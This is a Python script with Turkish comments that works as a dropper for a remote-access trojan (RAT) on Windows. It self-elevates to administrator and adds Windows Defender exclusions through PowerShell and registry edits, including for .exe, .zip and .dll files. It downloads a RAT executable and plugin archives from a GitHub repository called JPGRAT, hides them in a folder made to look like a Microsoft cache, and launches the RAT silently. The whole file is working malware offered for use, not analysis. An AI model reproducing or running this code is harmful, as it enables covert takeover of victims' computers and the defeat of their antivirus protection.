import os
import sys
import subprocess
import urllib.request
import ctypes
import shutil
import zipfile
import random
import string
import time

# ---- Yönetici kontrolü ----
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
    sys.exit()

# ---- İstisna ekleme ----
def add_defender_exclusion(path):
    cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \'{path}\' -Force"'
    subprocess.run(cmd, shell=True, capture_output=True)

# ---- Gizleme ----
def set_hidden_attributes(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02 | 0x04)
    except:
        pass
    subprocess.run(f'powershell -Command "attrib +h +s \'{path}\'"', shell=True, capture_output=True)

# ---- SAĞLAM İNDİRME ----
def download_file(url, dest):
    print(f"[i] İndirme başlatıldı: {url}")

    if os.path.exists(dest):
        try:
            os.remove(dest)
            print(f"[i] Eski dosya silindi: {dest}")
        except Exception as e:
            print(f"[-] Eski dosya silinemedi: {e}, geçici dosyaya yazılacak.")

    temp_dest = dest + ".tmp_" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=30) as response:
            data = response.read()
            if len(data) < 1024:
                raise Exception(f"Dosya çok küçük ({len(data)} bayt)")
            with open(temp_dest, 'wb') as f:
                f.write(data)
        if os.path.exists(dest):
            os.remove(dest)
        os.rename(temp_dest, dest)
        print(f"[+] İndirme başarılı: {dest} ({len(data)} bayt)")
        return True
    except Exception as e:
        print(f"[-] İndirme başarısız: {e}")
        if os.path.exists(temp_dest):
            try:
                os.remove(temp_dest)
            except:
                pass
        return False

# ---- GELİŞMİŞ ZIP ÇIKARMA ----
def extract_zip(zip_path, dest_dir):
    print(f"[i] ZIP çıkartılıyor: {zip_path} -> {dest_dir}")

    if not os.path.exists(zip_path) or os.path.getsize(zip_path) < 1024:
        print(f"[-] ZIP dosyası geçersiz veya çok küçük.")
        return False

    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            for member in z.namelist():
                safe_name = member.replace('\\', '/').replace(':', '_').replace('*', '_').replace('?', '_').replace('"', '_').replace('<', '_').replace('>', '_').replace('|', '_')
                if safe_name != member:
                    try:
                        z.extract(member, dest_dir)
                        source = os.path.join(dest_dir, member)
                        target = os.path.join(dest_dir, safe_name)
                        if os.path.exists(source):
                            os.rename(source, target)
                    except:
                        pass
                else:
                    try:
                        z.extract(member, dest_dir)
                    except:
                        pass
            print("[+] ZIP başarıyla çıkartıldı (zipfile).")
            return True
    except Exception as e:
        print(f"[-] zipfile ile çıkarma başarısız: {e}")

    try:
        print("[i] PowerShell ile çıkarma deneniyor...")
        ps_cmd = f'Expand-Archive -Path "{zip_path}" -DestinationPath "{dest_dir}" -Force'
        subprocess.run(
            f'powershell -ExecutionPolicy Bypass -Command "{ps_cmd}"',
            shell=True, check=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )
        print("[+] ZIP başarıyla çıkartıldı (PowerShell).")
        return True
    except Exception as e:
        print(f"[-] PowerShell ile çıkarma başarısız: {e}")

    return False

# ---- Ana işlem ----
def main():
    if not is_admin():
        run_as_admin()

    cache_dir = os.path.join(os.environ.get("ProgramData", "C:\\ProgramData"), "Microsoft", "Windows", "Caches")
    os.makedirs(cache_dir, exist_ok=True)

    plugin_dir = os.path.join(cache_dir, "Plugins")
    os.makedirs(plugin_dir, exist_ok=True)

    # ---- 1. İSTİSNALAR (KLASÖR + DOSYA) ----
    print("[i] İstisnalar ekleniyor...")
    add_defender_exclusion(cache_dir)
    add_defender_exclusion(plugin_dir)
    add_defender_exclusion(os.environ.get("TEMP", "C:\\Temp"))

    rat_path = os.path.join(cache_dir, "sensinaynenmehmetosensin.exe")
    plugin1_path = os.path.join(cache_dir, "Plugin1.zip")
    plugin2_path = os.path.join(cache_dir, "Plugin2.zip")

    add_defender_exclusion(rat_path)
    add_defender_exclusion(plugin1_path)
    add_defender_exclusion(plugin2_path)

    # ---- UZANTI İSTİSNALARI (REG ADD İLE, SEÇENEK 2) ----
    # PowerShell kullanılmıyor, doğrudan kayıt defterine yazılıyor
    subprocess.run('reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v ".exe" /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
    subprocess.run('reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v ".zip" /t REG_DWORD /d 0 /f', shell=True, capture_output=True)
    subprocess.run('reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions" /v ".dll" /t REG_DWORD /d 0 /f', shell=True, capture_output=True)

    time.sleep(1)

    # ---- 2. RAT İNDİR ----
    print("[i] RAT indiriliyor...")
    rat_url = "https://raw.githubusercontent.com/sanalortam/JPGRAT/main/sensinaynenmehmetosensin.exe"
    if not download_file(rat_url, rat_path):
        rat_url2 = "https://github.com/sanalortam/JPGRAT/raw/main/sensinaynenmehmetosensin.exe"
        if not download_file(rat_url2, rat_path):
            print("[!] RAT indirilemedi! Çıkılıyor...")
            input("Devam etmek için Enter...")
            sys.exit(1)

    print(f"[i] RAT dosyası boyutu: {os.path.getsize(rat_path)} bayt")
    set_hidden_attributes(rat_path)

    # ---- 3. PLUGIN ZIP'LERİ ----
    plugin_urls = [
        ("https://raw.githubusercontent.com/sanalortam/JPGRAT/main/Plugin1.zip", plugin1_path),
        ("https://raw.githubusercontent.com/sanalortam/JPGRAT/main/Plugin2.zip", plugin2_path)
    ]

    for idx, (url, path) in enumerate(plugin_urls):
        print(f"[i] Plugin {idx+1} indiriliyor...")
        if not download_file(url, path):
            alt = url.replace("raw.githubusercontent.com", "github.com").replace("/main/", "/raw/main/")
            if not download_file(alt, path):
                print(f"[!] Plugin {idx+1} indirilemedi, atlanıyor.")
                continue

        if os.path.getsize(path) < 1024:
            print(f"[!] Plugin {idx+1} çok küçük, atlanıyor.")
            continue

        if extract_zip(path, plugin_dir):
            print(f"[+] Plugin {idx+1} çıkartıldı.")
            for root, _, files in os.walk(plugin_dir):
                for f in files:
                    fp = os.path.join(root, f)
                    set_hidden_attributes(fp)
        else:
            print(f"[!] Plugin {idx+1} çıkartılamadı!")

        try:
            os.remove(path)
        except:
            pass

    # ---- 4. Gizle ve çalıştır ----
    set_hidden_attributes(cache_dir)
    set_hidden_attributes(plugin_dir)

    print("[i] RAT çalıştırılıyor...")
    subprocess.Popen([rat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW, cwd=cache_dir)

    print("[+] İşlem tamam. RAT arka planda çalışıyor.")
    input("Çıkmak için Enter...")

if __name__ == "__main__":
    main()